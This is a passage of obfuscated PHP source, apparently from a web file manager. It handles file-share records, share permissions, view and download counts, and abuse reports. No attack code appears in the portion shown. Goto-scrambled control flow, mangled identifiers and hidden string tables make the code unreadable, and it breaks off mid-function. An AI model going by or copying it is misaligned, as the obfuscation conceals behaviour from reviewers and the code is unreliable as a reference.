$C•œ„†ì[83] && $eõÏÁí¹ğË[$C•œ„†ì[444]] == $C•œ„†ì[464]) { $báÙáêÁĞÔ = $C•œ„†ì[2185]; } Model($C•œ„†ì[501])->eventShare($EÉÌ·æêñÛ, $báÙáêÁĞÔ); goto D„­¶‘ªğÚ; fŒ†œòÙà: $báÙáêÁĞÔ = $C•œ„†ì[2183]; if ($Fª‰œô¢–¿[$C•œ„†ì[442]] == $C•œ„†ì[464] && $eõÏÁí¹ğË[$C•œ„†ì[442]] == $C•œ„†ì[83]) { $báÙáêÁĞÔ = $C•œ„†ì[2181]; } if ($Fª‰œô¢–¿[$C•œ„†ì[442]] == $C•œ„†ì[83] && $eõÏÁí¹ğË[$C•œ„†ì[442]] == $C•œ„†ì[464]) { $báÙáêÁĞÔ = $C•œ„†ì[2184]; } goto bˆçÙ¶Å©; A£ïù³ğ­Ñ: } private function _addShareData($AÇòêå¶â‘, $FÜšŒë†•ò = array()) { goto d´ĞçÃ¶è; cÒ…ñ¤„ğ´: if ($CˆæËøœº– = $this->where($D¸ “Û­î‡)->find()) { return $CˆæËøœº–[$A„ƒæ‘ŠÊ‹[437]]; } if ($AÇòêå¶â‘ == 0) { $cºääÉ¡Ê = array($A„ƒæ‘ŠÊ‹[28] => get_path_this($FÜšŒë†•ò[$A„ƒæ‘ŠÊ‹[75]])); } else { $cºääÉ¡Ê = Model($A„ƒæ‘ŠÊ‹[748])->sourceInfo($AÇòêå¶â‘); if (!$cºääÉ¡Ê) { return !1; } } if (!$FÜšŒë†•ò[$A„ƒæ‘ŠÊ‹[1309]]) { $FÜšŒë†•ò[$A„ƒæ‘ŠÊ‹[1309]] = $cºääÉ¡Ê[$A„ƒæ‘ŠÊ‹[28]]; } goto B½Ú‚òÛš‘; B½Ú‚òÛš‘: $cñÀ²ùŒö = array($A„ƒæ‘ŠÊ‹[1392] => USER_ID, $A„ƒæ‘ŠÊ‹[380] => $AÇòêå¶â‘, $A„ƒæ‘ŠÊ‹[1309] => $A„ƒæ‘ŠÊ‹[33], $A„ƒæ‘ŠÊ‹[442] => 0, $A„ƒæ‘ŠÊ‹[444] => 0, $A„ƒæ‘ŠÊ‹[1006] => $A„ƒæ‘ŠÊ‹[33], $A„ƒæ‘ŠÊ‹[292] => $A„ƒæ‘ŠÊ‹[33], $A„ƒæ‘ŠÊ‹[792] => $A„ƒæ‘ŠÊ‹[33], $A„ƒæ‘ŠÊ‹[2187] => 0, $A„ƒæ‘ŠÊ‹[2188] => 0, $A„ƒæ‘ŠÊ‹[692] => 0, $A„ƒæ‘ŠÊ‹[2189] => $A„ƒæ‘ŠÊ‹[33], $A„ƒæ‘ŠÊ‹[439] => $A„ƒæ‘ŠÊ‹[33]); $e¥¯í—àáÈ = explode($A„ƒæ‘ŠÊ‹[47], $A„ƒæ‘ŠÊ‹[2190]); foreach ($e¥¯í—àáÈ as $f—Š´º¢œ) { if (!isset($FÜšŒë†•ò[$f—Š´º¢œ])) { continue; } $cñÀ²ùŒö[$f—Š´º¢œ] = $FÜšŒë†•ò[$f—Š´º¢œ]; } goto ešª˜¶ãŸó; ešª˜¶ãŸó: $dîøé…·ïò = $this->add($cñÀ²ùŒö); $f±†¦¨Õ‚¼ = array($A„ƒæ‘ŠÊ‹[439] => short_id($dîøé…·ïò)); $this->where(array($A„ƒæ‘ŠÊ‹[436] => $dîøé…·ïò))->save($f±†¦¨Õ‚¼); goto EÙÎò…ó£¤; d´ĞçÃ¶è: $A„ƒæ‘ŠÊ‹ =& $_SERVER[£ü]; $D¸ “Û­î‡ = array($A„ƒæ‘ŠÊ‹[380] => $AÇòêå¶â‘, $A„ƒæ‘ŠÊ‹[1392] => USER_ID); if ($AÇòêå¶â‘ == 0) { $D¸ “Û­î‡ = array($A„ƒæ‘ŠÊ‹[2186] => $FÜšŒë†•ò[$A„ƒæ‘ŠÊ‹[1006]], $A„ƒæ‘ŠÊ‹[1392] => USER_ID); } goto cÒ…ñ¤„ğ´; EÙÎò…ó£¤: return $dîøé…·ïò; goto dñ’³ªÄƒ·; dñ’³ªÄƒ·: } private function _shareAuthSet($FÌÌÓ‚Ìæ, $Cö½¦…Ù¡) { goto cĞ¦À¯İåã; cĞ¦À¯İåã: $AÌÊ„‹Öö• =& $_SERVER[£ü]; if (!is_array($Cö½¦…Ù¡)) { return !1; } $bƒ¢ô’”òŸ = Model($AÌÊ„‹Öö•[2191]); goto a¦´¨æ”Ğ—; a¦´¨æ”Ğ—: $bƒ¢ô’”òŸ->where(array($AÌÊ„‹Öö•[437] => $FÌÌÓ‚Ìæ))->delete(); $F¡áôš¤ÇÑ = array(); foreach ($Cö½¦…Ù¡ as $dÍµ¾¡‹‘Ê) { $a¥©æòª„ = SourceModel::TYPE_USER; if ($dÍµ¾¡‹‘Ê[$AÌÊ„‹Öö•[368]] == SourceModel::TYPE_GROUP) { $a¥©æòª„ = SourceModel::TYPE_GROUP; } $FõœŒîšßÉ = array($AÌÊ„‹Öö•[437] => $FÌÌÓ‚Ìæ, $AÌÊ„‹Öö•[368] => $a¥©æòª„, $AÌÊ„‹Öö•[452] => intval($dÍµ¾¡‹‘Ê[$AÌÊ„‹Öö•[452]]), $AÌÊ„‹Öö•[2192] => 0, $AÌÊ„‹Öö•[2193] => -1); if ($dÍµ¾¡‹‘Ê[$AÌÊ„‹Öö•[2192]]) { $FõœŒîšßÉ[$AÌÊ„‹Öö•[2192]] = $dÍµ¾¡‹‘Ê[$AÌÊ„‹Öö•[2192]]; } else { if ($dÍµ¾¡‹‘Ê[$AÌÊ„‹Öö•[2193]]) { $FõœŒîšßÉ[$AÌÊ„‹Öö•[2193]] = $dÍµ¾¡‹‘Ê[$AÌÊ„‹Öö•[2193]]; } } $F¡áôš¤ÇÑ[] = $FõœŒîšßÉ; } goto C‚ ö—¬œ×; C‚ ö—¬œ×: return $bƒ¢ô’”òŸ->addAll($F¡áôš¤ÇÑ, array(), !0); goto D‘Â„ÚŞÒ³; D‘Â„ÚŞÒ³: } public function numViewAdd($cÙ¦Ó“ÑÏÖ) { $EîÚà‰š¿ =& $_SERVER[£ü]; $D»·àäĞÈÖ = array($EîÚà‰š¿[436] => $cÙ¦Ó“ÑÏÖ); $this->where($D»·àäĞÈÖ)->setAdd($EîÚà‰š¿[2187]); } public function numDownloadAdd($CÇÍõï‚â¹) { $E¶Š‹ÈÏá» =& $_SERVER[£ü]; $dâ«è—õæ = array($E¶Š‹ÈÏá»[436] => $CÇÍõï‚â¹); $this->where($dâ«è—õæ)->setAdd($E¶Š‹ÈÏá»[2188]); } protected function shareEdit($aš“Ú¨ÃÉ, $A Ğò»™ƒ‘) { goto Eê¹¤²©Ÿ‘; Eê¹¤²©Ÿ‘: $E§ë†ÓøÄ‰ =& $_SERVER[£ü]; $båº±’á§ = $this->getInfo($aš“Ú¨ÃÉ); if (!$båº±’á§) { return !1; } goto aŠé”š×äø; a§Í·¹ºƒ: if (isset($A Ğò»™ƒ‘[$E§ë†ÓøÄ‰[2180]])) { $this->_shareAuthSet($aš“Ú¨ÃÉ, $A Ğò»™ƒ‘[$E§ë†ÓøÄ‰[2180]]); } return !0; goto CØáÛ©®Éà; aŠé”š×äø: $this->_checkLinkShare($A Ğò»™ƒ‘, $båº±’á§); $fĞÛôÉ†´î = array(); $aÚ˜øê²‚Ñ = explode($E§ë†ÓøÄ‰[47], $E§ë†ÓøÄ‰[2194]); goto DÜ”ô×¬Ë–; DÜ”ô×¬Ë–: foreach ($aÚ˜øê²‚Ñ as $eøŒ¬ö‘Çè) { if (!array_key_exists($eøŒ¬ö‘Çè, $A Ğò»™ƒ‘)) { continue; } $fĞÛôÉ†´î[$eøŒ¬ö‘Çè] = $A Ğò»™ƒ‘[$eøŒ¬ö‘Çè]; } $this->shareEventAdd($båº±’á§[$E§ë†ÓøÄ‰[366]], $A Ğò»™ƒ‘, $E§ë†ÓøÄ‰[2032]); $this->where(array($E§ë†ÓøÄ‰[436] => $aš“Ú¨ÃÉ))->save($fĞÛôÉ†´î); goto a§Í·¹ºƒ; CØáÛ©®Éà: } private function _checkLinkShare($a ƒ¾é’åÇ, $aÈÔ£éÔ) { goto fƒ£¬ğäÓÆ; Aº·õ®³ä: if ($aÈÔ£éÔ[$fçïù•ÃŒ³[388]][$fçïù•ÃŒ³[29]] != $fçïù•ÃŒ³[164]) { $c‰êŒáĞÅ¯ = $this->_folderReport($d¾ÑÁ’å–); if (!$c‰êŒáĞÅ¯) { return; } show_json(LNG($fçïù•ÃŒ³[2195]) . $fçïù•ÃŒ³[2196] . $c‰êŒáĞÅ¯, !1); } $DùÔ©î¶¥¢ = Model($fçïù•ÃŒ³[748])->fileInfoGet($aÈÔ£éÔ[$fçïù•ÃŒ³[388]][$fçïù•ÃŒ³[366]]); if (!$DùÔ©î¶¥¢) { return; } goto fÚšö¤Øí·; fƒ£¬ğäÓÆ: $fçïù•ÃŒ³ =& $_SERVER[£ü]; if ($a ƒ¾é’åÇ[$fçïù•ÃŒ³[442]] != $fçïù•ÃŒ³[83]) { return; } $d¾ÑÁ’å– = $aÈÔ£éÔ[$fçïù•ÃŒ³[388]][$fçïù•ÃŒ³[366]]; goto Aº·õ®³ä; fÚšö¤Øí·: $d°ˆÉ‰»ë‹ = $this->shareFileMeta($DùÔ©î¶¥¢[$fçïù•ÃŒ³[415]]); if (isset($d°ˆÉ‰»ë‹[$fçïù•ÃŒ³[356]]) && $d°ˆÉ‰»ë‹[$fçïù•ÃŒ³[356]] == $fçïù•ÃŒ³[83]) { show_json(LNG($fçïù•ÃŒ³[2197]), !1); } goto CãÌÆ›ÑÕ; CãÌÆ›ÑÕ: } private function _folderReport($Fà¬äØÕ¿) { goto b½ŸáêÂçÈ; Dô®‡·ŸÅâ: $CÛĞ¸ÒŞµõ = array_to_keyvalue($d¿Í«éĞ£î, $EğáÄ§Û×Õ[33], $EğáÄ§Û×Õ[28]); $CÛĞ¸ÒŞµõ[] = $cºÓÈéåÏ[$EğáÄ§Û×Õ[28]]; return implode($EğáÄ§Û×Õ[8], $CÛĞ¸ÒŞµõ); goto A¹ˆ”‡ëÛ; b½ŸáêÂçÈ: $EğáÄ§Û×Õ =& $_SERVER[£ü]; $BÃ¶µŒ«† = array($EğáÄ§Û×Õ[415] => array($EğáÄ§Û×Õ[916], 0), $EğáÄ§Û×Õ[678] => 3); $d›çæñ…ä© = Model($EğáÄ§Û×Õ[2198])->where($BÃ¶µŒ«†)->field($EğáÄ§Û×Õ[415])->select(); goto a–Şºï–ÍŒ; a–Şºï–ÍŒ: if (!$d›çæñ…ä©) { return !1; } $d›çæñ…ä© = array_to_keyvalue($d›çæñ…ä©, $EğáÄ§Û×Õ[33], $EğáÄ§Û×Õ[415]); $B“„ØÛ¦ò = $EğáÄ§Û×Õ[47] . $Fà¬äØÕ¿ . $EğáÄ§Û×Õ[47]; goto c™ÈÍÆ£Ï¢; c™ÈÍÆ£Ï¢: $BÃ¶µŒ«† = array($EğáÄ§Û×Õ[415] => array($EğáÄ§Û×Õ[7], $d›çæñ…ä©), $EğáÄ§Û×Õ[455] => array($EğáÄ§Û×Õ[747], "\45{$B“„ØÛ¦ò}\x25"), $EğáÄ§Û×Õ[393] => 0); $cºÓÈéåÏ = Model($EğáÄ§Û×Õ[748])->where($BÃ¶µŒ«†)->field($EğáÄ§Û×Õ[2199])->find(); if (!$cºÓÈéåÏ) { return !1; } goto C‡„¸›‚Ôğ; C‡„¸›‚Ôğ: $F¬ÚØ¾í‘Ş = substr($cºÓÈéåÏ[$EğáÄ§Û×Õ[455]], strpos($cºÓÈéåÏ[$EğáÄ§Û×Õ[455]], $B“„ØÛ¦ò)); $BÃ¶µŒ«† = array($EğáÄ§Û×Õ[366] => array($EğáÄ§Û×Õ[7], trim($F¬ÚØ¾í‘Ş, $EğáÄ§Û×Õ[47]))); $d¿Í«éĞ£î = Model($EğáÄ§Û×Õ[748])->where($BÃ¶µŒ«†)->field($EğáÄ§Û×Õ[28])->select(); goto Dô®‡·ŸÅâ; A¹ˆ”‡ëÛ: } protected function remove($c±ÏÕñ÷ò) { goto fôÀ‘„å¿½; F„ÓçÈ’: $Eİ¡¬¦áÑì = $this->where($C§ˆ½»ƒÃ)->delete(); if ($Eİ¡¬¦áÑì) { Model($e×‘šÄÌ¼[533])->where(array($e×‘šÄÌ¼[437] => $c±ÏÕñ÷ò))->delete(); } $FÂÔ³Ü÷© = is_array($c±ÏÕñ÷ò) ? $c±ÏÕñ÷ò[1] : array($c±ÏÕñ÷ò); goto f”É°ˆîÃ; fôÀ‘„å¿½: $e×‘šÄÌ¼ =& $_SERVER[£ü]; if (is_array($c±ÏÕñ÷ò)) { $c±ÏÕñ÷ò = array($e×‘šÄÌ¼[7], $c±ÏÕñ÷ò); } $C§ˆ½»ƒÃ = array($e×‘šÄÌ¼[437] => $c±ÏÕñ÷ò); goto F„ÓçÈ’; f”É°ˆîÃ: for ($cÅğÙ¤¿¢ = 0; $cÅğÙ¤¿¢ < count($FÂÔ³Ü÷©); $cÅğÙ¤¿¢++) { $aêÆÌµ³ = $this->getInfo($FÂÔ³Ü÷©[$cÅğÙ¤¿¢]); if ($aêÆÌµ³[$e×‘šÄÌ¼[444]] == $e×‘šÄÌ¼[83]) { Model($e×‘šÄÌ¼[501])->eventShare($aêÆÌµ³[$e×‘šÄÌ¼[366]], $e×‘šÄÌ¼[2185]); } if ($aêÆÌµ³[$e×‘šÄÌ¼[442]] == $e×‘šÄÌ¼[83]) { Model($e×‘šÄÌ¼[501])->eventShare($aêÆÌµ³[$e×‘šÄÌ¼[366]], $e×‘šÄÌ¼[2184]); } } return $Eİ¡¬¦áÑì; goto FôíğÃóõ; FôíğÃóõ: } protected function removeBySource($b»¢Š¢¶‹•) { goto eàÌµá¼‹; eàÌµá¼‹: $AÂÄ†º‘ÈÔ =& $_SERVER[£ü]; $D“øéô¯£ = array($AÂÄ†º‘ÈÔ[380] => array($AÂÄ†º‘ÈÔ[381], $b»¢Š¢¶‹•)); $cª‘˜Ü‡ö¹ = $this->field($AÂÄ†º‘ÈÔ[437])->where($D“øéô¯£)->select(); goto eˆïİò²â§; eˆïİò²â§: $cª‘˜Ü‡ö¹ = array_to_keyvalue($cª‘˜Ü‡ö¹, $AÂÄ†º‘ÈÔ[33], $AÂÄ†º‘ÈÔ[437]); if (!$cª‘˜Ü‡ö¹) { return; } $D“øéô¯£ = array($AÂÄ†º‘ÈÔ[436] => array($AÂÄ†º‘ÈÔ[381], $cª‘˜Ü‡ö¹)); goto E“ˆ ÒŸÏ; E“ˆ ÒŸÏ: $this->where($D“øéô¯£)->delete(); Model($AÂÄ†º‘ÈÔ[533])->where($D“øéô¯£)->delete(); goto eÜÈñ‰æ¬´; eÜÈñ‰æ¬´: } public function listAll($bíĞŒÒŒÈè) { goto FÔ¼à—´õÁ; E®…ˆëÅ“Ş: if ($bíĞŒÒŒÈè[$c¦¨¤µ¼¾Š[691]]) { $B…ÙÙØ™åÖ = $bíĞŒÒŒÈè[$c¦¨¤µ¼¾Š[692]] ? $bíĞŒÒŒÈè[$c¦¨¤µ¼¾Š[692]] : strtotime(date($c¦¨¤µ¼¾Š[2200])); $Añ¹­ŞŒ’á[$c¦¨¤µ¼¾Š[184]] = array($c¦¨¤µ¼¾Š[318], array($bíĞŒÒŒÈè[$c¦¨¤µ¼¾Š[691]], $B…ÙÙØ™åÖ)); } if ($bíĞŒÒŒÈè[$c¦¨¤µ¼¾Š[29]]) { $Añ¹­ŞŒ’á[$bíĞŒÒŒÈè[$c¦¨¤µ¼¾Š[29]]] = 1; } else { $Añ¹­ŞŒ’á[] = array($c¦¨¤µ¼¾Š[442] => array($c¦¨¤µ¼¾Š[916], 0), $c¦¨¤µ¼¾Š[444] => array($c¦¨¤µ¼¾Š[916], 0), $c¦¨¤µ¼¾Š[2175] => $c¦¨¤µ¼¾Š[2144]); } if ($bíĞŒÒŒÈè[$c¦¨¤µ¼¾Š[2140]]) { $Añ¹­ŞŒ’á[] = array($c¦¨¤µ¼¾Š[439] => $bíĞŒÒŒÈè[$c¦¨¤µ¼¾Š[2140]], $c¦¨¤µ¼¾Š[1309] => array($c¦¨¤µ¼¾Š[747], "\x25{$bíĞŒÒŒÈè[$c¦¨¤µ¼¾Š[2140]]}\x25"), $c¦¨¤µ¼¾Š[2175] => $c¦¨¤µ¼¾Š[2144]); } goto dµÖ Êåæ©; FÔ¼à—´õÁ: $c¦¨¤µ¼¾Š =& $_SERVER[£ü]; $Añ¹­ŞŒ’á = array(); if ($bíĞŒÒŒÈè[$c¦¨¤µ¼¾Š[1401]]) { $Añ¹­ŞŒ’á[$c¦¨¤µ¼¾Š[1401]] = $bíĞŒÒŒÈè[$c¦¨¤µ¼¾Š[1401]]; } goto E®…ˆëÅ“Ş; dµÖ Êåæ©: $b÷‡§‹äˆ = $this->_makeOrder()->where($Añ¹­ŞŒ’á)->selectPage(20); if (empty($b÷‡§‹äˆ[$c¦¨¤µ¼¾Š[351]])) { return array(); } $this->_listDataApply($b÷‡§‹äˆ[$c¦¨¤µ¼¾Š[351]]); goto bïá¹“öÁ; bïá¹“öÁ: return $b÷‡§‹äˆ; goto a™’òö‘ªÒ; a™’òö‘ªÒ: } public function listDataApply($Cø»Œß©‘) { $this->_listDataApply($Cø»Œß©‘); return $Cø»Œß©‘; } private function _listDataApply(&$fÜÌ…£Æ´õ) { $eÃ‰¼Ø¿ï =& $_SERVER[£ü]; $B²Ü­™¬á = array_to_keyvalue($fÜÌ…£Æ´õ, $eÃ‰¼Ø¿ï[33], $eÃ‰¼Ø¿ï[1401]); $bæ±¯¥¸Ì† = Model($eÃ‰¼Ø¿ï[473])->userListInfo(array_unique($B²Ü­™¬á)); $c‚ëåÇùõ® = array_to_keyvalue($fÜÌ…£Æ´õ, $eÃ‰¼Ø¿ï[33], $eÃ‰¼Ø¿ï[366]); $a™£¸µ®„³ = Model($eÃ‰¼Ø¿ï[748])->sourceListInfo($c‚ëåÇùõ®, !0); foreach ($fÜÌ…£Æ´õ as &$BÆïåŠÔ¥è) { $FÚªŒÙ¤Ÿ„ = $BÆïåŠÔ¥è[$eÃ‰¼Ø¿ï[1401]]; $BÆïåŠÔ¥è[$eÃ‰¼Ø¿ï[2201]] = $bæ±¯¥¸Ì†[$FÚªŒÙ¤Ÿ„] ? $bæ±¯¥¸Ì†[$FÚªŒÙ¤Ÿ„] : !1; $fºÂ‘†ã­† = $BÆïåŠÔ¥è[$eÃ‰¼Ø¿ï[366]]; $BÆïåŠÔ¥è[$eÃ‰¼Ø¿ï[388]] = $a™£¸µ®„³[$fºÂ‘†ã­†] ? $a™£¸µ®„³[$fºÂ‘†ã­†] : !1; } } private function _makeOrder($CŸñ¥ÙØ = '') { goto e©…í‚¿Š; e©…í‚¿Š: $BóÖ‹„êÄÑ =& $_SERVER[£ü]; $dã«¶ªƒ¢š = array($BóÖ‹„êÄÑ[184], $BóÖ‹„êÄÑ[692], $BóÖ‹„êÄÑ[2187], $BóÖ‹„êÄÑ[2188]); $AõİŒìåç˜ = array($BóÖ‹„êÄÑ[398] => $BóÖ‹„êÄÑ[399], $BóÖ‹„êÄÑ[400] => $BóÖ‹„êÄÑ[401]); goto c °ê”õä©; c °ê”õä©: $EÒôæŸ» = Input::get($BóÖ‹„êÄÑ[403], $BóÖ‹„êÄÑ[7], $BóÖ‹„êÄÑ[386], $dã«¶ªƒ¢š); $eŒÄ¬ÉÚ§ğ = Input::get($BóÖ‹„êÄÑ[404], $BóÖ‹„êÄÑ[7], $BóÖ‹„êÄÑ[2202], array($BóÖ‹„êÄÑ[2139], $BóÖ‹„êÄÑ[400])); $eŒÄ¬ÉÚ§ğ = $AõİŒìåç˜[$eŒÄ¬ÉÚ§ğ]; goto A‰ä¬…ÚÂ; A‰ä¬…ÚÂ: $CŸñ¥ÙØ = $CŸñ¥ÙØ . "{$EÒôæŸ»}\x20{$eŒÄ¬ÉÚ§ğ}"; return $this->order($CŸñ¥ÙØ); goto D‰£À·Íë; D‰£À·Íë: } public function reportAdd($D©¿ğñ´­¶) { $DéÒÕ˜ğ”¢ =& $_SERVER[£ü]; $f·Î’‰£ò = array($DéÒÕ˜ğ”¢[437] => $D©¿ğñ´­¶[$DéÒÕ˜ğ”¢[437]], $DéÒÕ˜ğ”¢[1401] => USER_ID); if (Model($DéÒÕ˜ğ”¢[2198])->where($f·Î’‰£ò)->find()) { return !1; } $Eñßˆ›åå = array($DéÒÕ˜ğ”¢[437] => $D©¿ğñ´­¶[$DéÒÕ˜ğ”¢[437]], $DéÒÕ˜ğ”¢[1309] => $D©¿ğñ´­¶[$DéÒÕ˜ğ”¢[1309]], $DéÒÕ˜ğ”¢[366] => $D©¿ğñ´­¶[$DéÒÕ˜ğ”¢[366]], $DéÒÕ˜ğ”¢[415] => $D©¿ğñ´­¶[$DéÒÕ˜ğ”¢[415]], $DéÒÕ˜ğ”¢[1401] => USER_ID, $DéÒÕ˜ğ”¢[29] => $D©¿ğñ´­¶[$DéÒÕ˜ğ”¢[29]], $DéÒÕ˜ğ”¢[401] => $D©¿ğñ´­¶[$DéÒÕ˜ğ”¢[401]]); return Model($DéÒÕ˜ğ”¢[2198])->add($Eñßˆ›åå); } public function reportList($CëĞêó£öš) { goto C¿Ô†¸×á; C¿Ô†¸×á: $a¡ÛùÉÙˆë =& $_SERVER[£ü]; $Dœ“Å¦êˆ = array(); if ($CëĞêó£öš[$a¡ÛùÉÙˆë[691]]) { $B¬÷ÓÊ«£ò = $CëĞêó£öš[$a¡ÛùÉÙˆë[692]] ? $CëĞêó£öš[$a¡ÛùÉÙˆë[692]] : strtotime(date($a¡ÛùÉÙˆë[2200])); $Dœ“Å¦êˆ[$a¡ÛùÉÙˆë[184]] = array($a¡ÛùÉÙˆë[318], array($CëĞêó£öš[$a¡ÛùÉÙˆë[691]], $B¬÷ÓÊ«£ò)); } goto AÁ¬—·™È; E«°®ŸµÅÅ: $a ‹‹ôóÚæ = array($a¡ÛùÉÙˆë[398] => $a¡ÛùÉÙˆë[399], $a¡ÛùÉÙˆë[400] => $a¡ÛùÉÙˆë[401]); $FºÓ«¡õ¹Ü = $a¡ÛùÉÙˆë[2206] . $a ‹‹ôóÚæ[$f¤ŞÑ¤ÉÎ]; $eÀ¨‰†‘Ÿô = Model($a¡ÛùÉÙˆë[2198])->where($Dœ“Å¦êˆ)->order($FºÓ«¡õ¹Ü)->selectPage(20); goto F©Œ‡ô™Ù; F©Œ‡ô™Ù: if (empty($eÀ¨‰†‘Ÿô[$a¡ÛùÉÙˆë[351]])) { return array(); } $this->_listDataApply($eÀ¨‰†‘Ÿô[$a¡ÛùÉÙˆë[351]]); return $eÀ¨‰†‘Ÿô; goto e¡„†Œ•Üƒ; AÁ¬—·™È: if (isset($CëĞêó£öš[$a¡ÛùÉÙˆë[29]]) && in_array($CëĞêó£öš[$a¡ÛùÉÙˆë[29]], array($a¡ÛùÉÙˆë[83], $a¡ÛùÉÙˆë[2203], $a¡ÛùÉÙˆë[2204], $a¡ÛùÉÙˆë[2205], $a¡ÛùÉÙˆë[1880]))) { $Dœ“Å¦êˆ[$a¡ÛùÉÙˆë[29]] = $CëĞêó£öš[$a¡ÛùÉÙˆë[29]]; } if (isset($CëĞêó£öš[$a¡ÛùÉÙˆë[678]]) && in_array($CëĞêó£öš[$a¡ÛùÉÙˆë[678]], array($a¡ÛùÉÙˆë[464], $a¡ÛùÉÙˆë[83], $a¡ÛùÉÙˆë[2203], $a¡ÛùÉÙˆë[2204]))) { $Dœ“Å¦êˆ[$a¡ÛùÉÙˆë[678]] = $CëĞêó£öš[$a¡ÛùÉÙˆë[678]]; } $f¤ŞÑ¤ÉÎ = Input::get($a¡ÛùÉÙˆë[404], $a¡ÛùÉÙˆë[7], $a¡ÛùÉÙˆë[2202], array($a¡ÛùÉÙˆë[2139], $a¡ÛùÉÙˆë[400])); goto E«°®ŸµÅÅ; e¡„†Œ•Üƒ: } public function reportStatus($F«“ìâŞ‹í) { goto CèÆˆÅ“–Î; B‰‚–¶§×Ş: $d¤¤§²‰Ãß = Model($CÃà‘ÅÇÆ®[2198])->where($aç—Àì‹ì)->save($f÷Ó¦Şø»Ç); if ($F«“ìâŞ‹í[$CÃà‘ÅÇÆ®[678]] == $CÃà‘ÅÇÆ®[2203]) { if ($f¢ÑğÇËïâ[$CÃà‘ÅÇÆ®[415]] != $CÃà‘ÅÇÆ®[464] && $this->shareFileMeta($f¢ÑğÇËïâ[$CÃà‘ÅÇÆ®[415]])) { $this->shareFileMeta($f¢ÑğÇËïâ[$CÃà‘ÅÇÆ®[415]], 0); } return $this->remove($f¢ÑğÇËïâ[$CÃà‘ÅÇÆ®[437]]); } if ($d¤¤§²‰Ãß && $F«“ìâŞ‹í[$CÃà‘ÅÇÆ®[678]] == $CÃà‘ÅÇÆ®[2204]) { $e”øøŞ¡øº = $f÷Ó¦Şø»Ç[$CÃà‘ÅÇÆ®[678]] == $CÃà‘ÅÇÆ®[2204] ? 1 : 0; $this->shareFileMeta($f¢ÑğÇËïâ[$CÃà‘ÅÇÆ®[415]], $e”øøŞ¡øº); $this->removeByFile($f¢ÑğÇËïâ[$CÃà‘ÅÇÆ®[415]]); } goto fâ°¬‰ÚùÒ; fâ°¬‰ÚùÒ: return $d¤¤§²‰Ãß; goto b¶» ßÍàâ; dÏíš·¦ò: if (!$f¢ÑğÇËïâ) { return !1; } $f÷Ó¦Şø»Ç = array($CÃà‘ÅÇÆ®[678] => $F«“ìâŞ‹í[$CÃà‘ÅÇÆ®[678]]); if ($F«“ìâŞ‹í[$CÃà‘ÅÇÆ®[678]] == $CÃà‘ÅÇÆ®[2204] && $f¢ÑğÇËïâ[$CÃà‘ÅÇÆ®[678]] == $CÃà‘ÅÇÆ®[2204]) { $f÷Ó¦Şø»Ç[$CÃà‘ÅÇÆ®[678]] = 0; } goto B‰‚–¶§×Ş; CèÆˆÅ“–Î: $CÃà‘ÅÇÆ® =& $_SERVER[£ü]; $aç—Àì‹ì = array($CÃà‘ÅÇÆ®[364] => $F«“ìâŞ‹í[$CÃà‘ÅÇÆ®[364]]); $f¢ÑğÇËïâ = Model($CÃà‘ÅÇÆ®[2198])->where($aç—Àì‹ì)->field($CÃà‘ÅÇÆ®[2207])->find(); goto dÏíš·¦ò; b¶» ßÍàâ: } private function removeByFile($BË¾ğÆ¼óÂ) { goto dñ…¸‡¸À™; f…éã¼¡…Ë: $açí¶›Ş‘õ = array($B­Ø™Ù¸Ÿ[366] => array($B­Ø™Ù¸Ÿ[7], $aò¯ˆÊ—ù—), $B­Ø™Ù¸Ÿ[442] => 1); $cËªàŞ±…° = Model($B­Ø™Ù¸Ÿ[2041])->where($açí¶›Ş‘õ)->field($B­Ø™Ù¸Ÿ[437])->select(); $Fë­‘ƒĞ‹– = array_to_keyvalue($cËªàŞ±…°, $B­Ø™Ù¸Ÿ[33], $B­Ø™Ù¸Ÿ[437]); goto c‰¶ÙÄ¡Ö‡; c‰¶ÙÄ¡Ö‡: $this->remove($Fë­‘ƒĞ‹–); goto fÒÌ¶ˆ¯‚ê; dñ…¸‡¸À™: $B­Ø™Ù¸Ÿ =& $_SERVER[£ü]; $cËªàŞ±…° = Model($B­Ø™Ù¸Ÿ[748])->where(array($B­Ø™Ù¸Ÿ[415] => $BË¾ğÆ¼óÂ))->field($B­Ø™Ù¸Ÿ[366])->select(); $aò¯ˆÊ—ù— = array_to_keyvalue($cËªàŞ±…°, $B­Ø™Ù¸Ÿ[33], $B­Ø™Ù¸Ÿ[366]); goto f…éã¼¡…Ë; fÒÌ¶ˆ¯‚ê: } private function shareFileMeta($eÜ ô»õ¦¨, $A»•êŠÖÄ = null) { $C›ô±ŸçåÂ =& $_SERVER[£ü]; $cª¼Æ¿ÛØâ = array($C›ô±ŸçåÂ[415] => $eÜ ô»õ¦¨, $C›ô±ŸçåÂ[89] => $C›ô±ŸçåÂ[2208]); if (is_null($A»•êŠÖÄ)) { return Model($C›ô±ŸçåÂ[2209])->where($cª¼Æ¿ÛØâ)->find(); } $cª¼Æ¿ÛØâ[$C›ô±ŸçåÂ[356]] = $A»•êŠÖÄ; Model($C›ô±ŸçåÂ[2209])->add($cª¼Æ¿ÛØâ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\x75\162\x63\145\x5f\x61\165\164\150"; public function getAuth($FÀ¬“Î‚Ô¯) { goto aÁ±ÔÁÊ’­; BËóĞÖÈÔõ: return $c¦Öè’‚´; goto BÉ£îšö; aÁ±ÔÁÊ’­: $C¯§±Íƒ×Ã =& $_SERVER[£ü]; $bñ¿íŸŸß‡ = $C¯§±Íƒ×Ã[2210]; $c¦îùš‚µ³ = array($C¯§±Íƒ×Ã[366] => $FÀ¬“Î‚Ô¯); goto D›‰®óÈ‹; D›‰®óÈ‹: $f„¸«ù…êÀ = $this->field($bñ¿íŸŸß‡)->order($C¯§±Íƒ×Ã[364])->where($c¦îùš‚µ³)->select(); $c¦Öè’‚´ = array(); foreach ($f„¸«ù…êÀ as $CÑ˜Ëº¿Šç) { if (Model($C¯§±Íƒ×Ã[2211])->listData($CÑ˜Ëº¿Šç[$C¯§±Íƒ×Ã[2192]])) { $c¦Öè’‚´[] = $CÑ˜Ëº¿Šç; } } goto BËóĞÖÈÔõ; BÉ£îšö: } public function setAuth($fŒ†¤Ã‚Š, $añŞè­ŒÉ) { goto F„÷Ã¶‡Ö; F„÷Ã¶‡Ö: $aÌ‡»ãÇ =& $_SERVER[£ü]; $EØŠÍ¾½­¦ = Model($aÌ‡»ãÇ[1100])->sourceInfo($fŒ†¤Ã‚Š); if ($EØŠÍ¾½­¦[$aÌ‡»ãÇ[368]] != SourceModel::TYPE_GROUP) { return !1; } goto 